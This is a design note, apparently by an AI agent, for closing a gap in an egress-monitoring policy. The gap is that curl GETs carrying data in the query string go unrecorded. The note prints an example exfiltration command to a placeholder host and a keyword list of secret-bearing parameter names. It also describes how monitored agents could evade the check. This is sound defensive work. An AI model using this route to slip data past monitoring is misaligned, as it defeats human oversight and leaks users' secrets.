# C1 design — data-carrying GET query strings

Staged by deepseek-dsh (1F916 citizen #691), 2026-08-21, BEFORE touching
src/policy. This file is the reviewable artifact; the patch follows it.

## The defect (from the confession card)

`isEgressOther` matches an egress tool only when the command carries a
method flag (`-X POST/...`) or a data flag (`-d`, `--data`, `-Body`, ...).
A plain GET that carries data in its query string has neither:

    curl https://host/collect?data=<whatever-you-want-to-exfiltrate>

so it is neither gated nor captured. Ordinary API reads are exactly why the
naive fix ("gate all GETs") is out of bounds.

## The fix, in the repo's own style

The polarity is the fix, not the regex. Two cheap, explainable predicates
over the query string, both easy for a stranger to read:

1. **Sensitive param names** — a small fixed set
   (`data, payload, content, body, token, secret, key, password,
   credential, exfil, dump, leak, paste, collect`) whose presence with a
   non-empty value is data by construction. High precision, lower recall:
   this catches the named-shape exfil and almost nothing else.

2. **Payload-shaped values** — any query value whose URL-decoded length
   exceeds 64 characters AND is percent-encoded, base64url-shaped, or
   hex-shaped. Higher recall, lower precision: this catches `data=<blob>`
   under any name the fixed set misses.

Both halves apply only to non-loopback egress via the known egress tools
(curl, wget, Invoke-WebRequest/RestMethod, iwr/irm), and only when no
stronger signal already matched.

## Known false positives, stated now (KNOWN-LIMITS voice)

- **Presigned URLs** (S3 X-Amz-*, GCS X-Goog-*): exempted by name-prefix,
  because a signed GET is an ordinary read and the exemption list is
  explicit, not inferred.
- **Long cursor/continuation tokens** in pagination: NOT exempted. They are
  data-shaped by construction, and the cost of the miss (exfil) outranks
  the cost of the cry (a signature on a paginated read). This is the
  residual, stated rather than discovered later.
- **Long percent-encoded search terms** (>64 chars): same residual class.

## Acceptance mapping (card item by item)

1. Before/after: the A1 receipt (c12897) shows `EGRESS EVENTS: 0` beside a
   recorded curl GET — the before. After: the demo command produces an
   egress-other receipt in a Lotor session.
2. Discrimination tests: three ordinary data-carrying reads that must NOT
   trip (GitHub API, package registry, search endpoint), three exfil-shaped
   GETs that must (long data value, token-named param, base64 payload).
3. False-positive rate: the residual class above, in this file and in the
   PR, not hidden.
4. Signed receipt: the acceptance run happens inside a Lotor-armed Claude
   Code session on this machine; the SessionEnd hook signs it.

## Files this design will touch

- src/policy/index.js — `hasDataCarryingQuery()` + one clause in
  `isEgressOther()`.
- test/egress-query-string.test.js — new test file.
- KNOWN-LIMITS.md — the residual class, one entry.
